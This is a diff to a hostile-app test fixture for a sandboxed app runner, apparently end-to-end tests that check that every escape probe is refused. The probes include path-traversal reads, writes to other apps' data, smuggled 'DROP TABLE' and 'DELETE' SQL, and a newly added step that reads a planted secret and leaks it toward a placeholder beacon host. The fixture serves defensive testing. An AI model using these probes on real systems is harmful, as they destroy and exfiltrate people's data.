@@ -1,13 +1,19 @@
 // A hostile app, as the person's own saved copy of an installed app's app.jsx. Each probe is something
 // the sandbox or the runner must refuse. It tries, catches, and records the outcome as text in the page;
 // test/e2e-prod/runner-gate.mjs reads the report and asserts every probe was refused. It sends nothing
-// anywhere real: the "beacon" host does not resolve, and the gate's request trace must never see it.
+// anywhere real: the gate's loopback listener (BEACON) must see nothing at all, however the data it read is "sent".
+//
+// The gate turns this file into a catalog bundle (the person installed a hostile app from a catalog entry: the code is
+// pinned, so it is the catalog's code that runs). __HOSTILE_ID__ and __BEACON__ are replaced, and the leak vectors
+// (test/fixtures/apps/leak-vectors.js) are spliced in below.
 import { useEffect, useState } from "react";
 import { kv, sql } from "@tinycloud/app";
 
-const BEACON = "https://beacon.invalid";
+const BEACON = "__BEACON__";
+const OWN = "__HOSTILE_ID__";
 const HEALTH = "xyz.tinycloud.sample.healthlog";
 const RECIPES = "xyz.tinycloud.sample.recipes";
+/*__LEAK_VECTORS__*/
 
 async function attempt(run) {
   try {
@@ -79,7 +85,7 @@ export default function HostileApp() {
       const c = r.cap;
       c.kvOutside = code(await kv.get("secrets/x"));
       c.kvTraversal = code(await kv.get("app/../prefs/goals.json"));
-      c.kvAbsoluteOwn = code(await kv.get(`/${HEALTH}/prefs/goals.json`));
+      c.kvAbsoluteOwn = code(await kv.get(`/${OWN}/prefs/goals.json`));
       c.kvAbsoluteOther = code(await kv.get(`/${RECIPES}/prefs/settings.json`));
       c.kvPutOwnCode = code(await kv.put("app/app.jsx", "pwned"));
       c.kvDeleteOwnCode = code(await kv.del("app/app.jsx"));
@@ -95,12 +101,21 @@ export default function HostileApp() {
       c.sqlUnicodeSpace = code(await sql.query("healthlog", "SELECT 1;\u00a0DROP TABLE meal"));
       c.sqlWriteAsQuery = code(await sql.query("healthlog", "DELETE FROM meal"));
       c.sqlExecuteForeign = code(await sql.execute(`/${RECIPES}/recipes`, "DELETE FROM recipe"));
-      c.sqlExecuteForeignAbsoluteOwn = code(await sql.execute(`/${HEALTH}/healthlog`, "DELETE FROM meal"));
+      c.sqlExecuteForeignAbsoluteOwn = code(await sql.execute(`/${OWN}/healthlog`, "DELETE FROM meal"));
+      c.sqlExecuteHealth = code(await sql.execute(`/${HEALTH}/healthlog`, "DELETE FROM meal"));
       c.sqlQueryForeign = code(await sql.query(`/${RECIPES}/recipes`, "SELECT 1"));
       c.oversize = code(await kv.put("prefs/big.json", "x".repeat(2_000_000)));
       c.badOpts = code(await kv.put("prefs/a.json", "x", { evil: true }));
       c.sane = code(await kv.put("prefs/probe.json", "{\"ok\":true}", { contentType: "application/json" }));
       c.saneGet = code(await kv.get("prefs/probe.json"));
+
+      // ---- the data an app reads, and every way it could be "sent": nothing may reach the listener
+      c.secretCreate = code(await sql.execute("healthlog", "CREATE TABLE IF NOT EXISTS secret (v TEXT)"));
+      c.secretInsert = code(await sql.execute("healthlog", "INSERT INTO secret (v) VALUES (?)", ["sensitive-meal-4242"]));
+      const read = await sql.query("healthlog", "SELECT v FROM secret LIMIT 1");
+      const marker = read.ok && read.rows[0] ? encodeURIComponent(String(read.rows[0][0])) : "none";
+      r.marker = marker;
+      r.vectors = await runLeakVectors(BEACON, marker, {});
 
       // ---- raw messages, as an app that does not use the module
       raw("cap/vault.get", "8001", { key: "x" });
